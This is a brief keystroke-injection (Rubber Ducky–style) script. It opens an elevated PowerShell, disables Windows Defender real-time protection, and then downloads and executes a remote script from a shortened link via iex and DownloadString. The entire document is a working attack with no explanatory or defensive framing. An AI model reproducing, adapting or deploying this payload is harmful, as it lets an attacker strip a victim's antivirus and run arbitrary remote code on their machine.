GUI r
DELAY 40
STRING powershell
CTRL SHIFT ENTER
DELAY 50
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 50
STRING iex(New-Object Net.WebClient).DownloadString('https://bit.ly/3YWTJKm')
ENTER
